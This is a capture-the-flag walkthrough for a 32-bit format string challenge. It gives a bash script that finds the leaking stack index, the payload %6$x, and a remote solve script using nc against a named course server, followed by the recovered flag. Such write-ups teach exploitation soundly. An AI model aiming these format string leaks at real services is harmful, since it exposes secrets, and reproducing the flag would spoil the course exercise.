# formatstring1 Quick Walkthrough

## Goal
Leak the passcode from the format string bug, then send it back at the second prompt.

Important note: this is a stack slot index, not a CPU register.

## 1) Quick way to find the correct index

Use this short bash loop to test %1$x through %12$x and report which one works:

```bash
for i in $(seq 1 12); do
  out=$(bash -lc '
idx="$1"
coproc P { ./random-game; }

while IFS= read -r line <&"${P[0]}"; do
  [[ "$line" == *"passcode to enter here?"* ]] && break
done

printf "%%%s\$x\n" "$idx" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"

while IFS= read -r line <&"${P[0]}"; do
  [[ "$line" == *"Again!"* ]] && break
done

printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
' _ "$i" 2>/dev/null)

  if printf "%s" "$out" | grep -q "Oh. You got the passcode"; then
    echo "idx=$i SUCCESS"
  else
    echo "idx=$i fail"
  fi
done
```

Expected result in this challenge:
- idx=6 SUCCESS

So your leak payload is:

```text
%6$x
```

## 2) Manual exploit (no automation)

Run:

```bash
./random-game
```

At first prompt, enter:

```text
%6$x
```

Program prints a hex value (example):

```text
221d13a7
```

At second prompt, enter that exact hex value:

```text
221d13a7
```

If correct, it takes the success path and prints the flag from:

```c
system("cat flag.answer");
```

## 3) Why index 6 works

The bug is printf(buf). On 32-bit x86, extra format reads come from stack words in the caller frame. In this binary, the passcode aligns with the 6th positional read.

## 4) Remote one-command solve (what you used)

Target:
- Host: moa6.eecs.utk.edu
- Port: 32100

```bash
bash -lc '
set -euo pipefail
coproc P { nc moa6.eecs.utk.edu 32100; }

while IFS= read -r line <&"${P[0]}"; do
  echo "$line"
  [[ "$line" == *"passcode to enter here?"* ]] && break
done

printf "%%6\$x\n" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"
echo "$leak"

while IFS= read -r line <&"${P[0]}"; do
  echo "$line"
  [[ "$line" == *"Again!"* ]] && break
done

printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
'
```

Verified output includes:

```text
cosc466-flag-{z4-TXkh#wu&7E4vN}
```

## 5) Common mistakes

- Using decimal instead of hex at second prompt.
- Adding spaces around the leaked value.
- Assuming index 6 always works in every binary.
- Calling it a register leak (it is a stack position leak).
